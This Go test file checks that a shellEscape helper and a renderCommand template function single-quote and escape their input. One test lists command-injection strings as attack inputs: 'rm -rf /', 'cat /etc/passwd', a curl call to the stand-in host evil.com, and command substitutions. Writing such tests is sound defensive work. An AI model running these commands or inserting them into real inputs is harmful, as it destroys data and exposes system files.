package tools

import (
	"strings"
	"testing"
	"testing/quick"
)

// --- TDD: Fix #3 — Shell escaping validation ---

func TestShellEscape_WrapsInSingleQuotes(t *testing.T) {
	cases := []struct {
		input, want string
	}{
		{"hello", "'hello'"},
		{"hello world", "'hello world'"},
		{"", "''"},
		{"it's", "'it'\\''s'"},
	}
	for _, tc := range cases {
		got := shellEscape(tc.input)
		if got != tc.want {
			t.Errorf("shellEscape(%q) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

func TestShellEscape_BlocksInjection(t *testing.T) {
	attacks := []string{
		"$(whoami)",
		"`id`",
		"; rm -rf /",
		"| cat /etc/passwd",
		"&& curl evil.com",
		"' || true '",
		"\n; echo pwned",
		"$((1+1))",
	}
	for _, attack := range attacks {
		escaped := shellEscape(attack)
		// Must start and end with single quote
		if !strings.HasPrefix(escaped, "'") || !strings.HasSuffix(escaped, "'") {
			t.Errorf("shellEscape(%q) = %q — not single-quote wrapped", attack, escaped)
		}
		// Must not contain unescaped single quotes (except wrapping)
		inner := escaped[1 : len(escaped)-1]
		// After removing the known escape sequence '\'' there should be no bare single quotes
		cleaned := strings.ReplaceAll(inner, "'\\''", "")
		if strings.Contains(cleaned, "'") {
			t.Errorf("shellEscape(%q) has unescaped single quote in inner: %q", attack, inner)
		}
	}
}

// PBT: for any input string, shellEscape must produce a single-quoted string
// where the only way a single quote appears is via the '\'' escape sequence.
func TestShellEscape_PBT_AlwaysSingleQuoteWrapped(t *testing.T) {
	f := func(s string) bool {
		escaped := shellEscape(s)
		if len(escaped) < 2 {
			return false
		}
		if escaped[0] != '\'' || escaped[len(escaped)-1] != '\'' {
			return false
		}
		inner := escaped[1 : len(escaped)-1]
		cleaned := strings.ReplaceAll(inner, "'\\''", "")
		return !strings.Contains(cleaned, "'")
	}
	if err := quick.Check(f, &quick.Config{MaxCount: 10000}); err != nil {
		t.Error(err)
	}
}

// PBT: renderCommand must escape all placeholder values
func TestRenderCommand_PBT_AllValuesEscaped(t *testing.T) {
	f := func(val string) bool {
		tmpl := "echo {{.input}}"
		result := renderCommand(tmpl, map[string]any{"input": val})
		// The result must contain the shell-escaped value, not the raw value
		// (unless the raw value happens to equal its escaped form)
		escaped := shellEscape(val)
		return strings.Contains(result, escaped)
	}
	if err := quick.Check(f, &quick.Config{MaxCount: 5000}); err != nil {
		t.Error(err)
	}
}
